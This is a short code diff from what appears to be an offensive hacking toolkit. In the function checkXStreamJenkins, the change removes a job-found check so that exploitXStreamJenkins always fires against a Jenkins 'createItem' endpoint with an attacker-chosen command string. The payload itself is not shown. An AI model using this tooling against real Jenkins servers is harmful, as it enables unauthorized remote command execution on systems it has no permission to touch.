@@ -639,12 +639,12 @@ def checkXStreamJenkins(ip, cmdstr):
             result = requests.get(url,timeout=10).content
             job = getJobFromJenkins(result)
             ver = getJenkinsVersion(result)
-            if job:
+            #if job:
                 #job_url = url + job + "config.xml"
-                job_url = url + "createItem?name=hackUtils"
-                exploitXStreamJenkins(job_url, cmdstr, ver)
-            else:
-                print '[!] no job found! url: '+url
+            job_url = url + "createItem?name=hackUtils"
+            exploitXStreamJenkins(job_url, cmdstr, ver)
+            #else:
+            #    print '[!] no job found! url: '+url
         except Exception,e:
             print '[!] connection failed! url: '+url
     else:
